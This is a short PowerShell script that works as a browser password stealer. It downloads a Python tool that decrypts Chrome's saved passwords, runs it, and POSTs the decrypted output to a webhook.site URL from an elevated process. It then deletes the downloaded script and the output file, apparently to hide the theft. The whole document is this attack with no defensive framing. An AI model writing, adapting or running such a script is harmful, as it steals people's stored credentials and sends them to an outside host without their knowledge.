# Define the URL of the Python script
$scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"

# Define the directory where you want to download the script
$scriptDir = "C:\"
$scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"

# Define the output file path
$outputFilePath = Join-Path -Path $scriptDir -ChildPath "output.txt"

# Download the Python script from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Install required Python packages
pip install pypiwin32 pycryptodome

# Execute the Python script and store the output
$output = python $scriptPath

# Write the output to a file
$output | Out-File -FilePath $outputFilePath

# Send the output to the webhook URL
Start-Process powershell -Verb RunAs -ArgumentList "-Command `"Invoke-WebRequest -Uri 'https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4' -Method POST -InFile '$outputFilePath'`""

Remove-Item -Path $scriptPath
Remove-Item -Path $outputFilePath
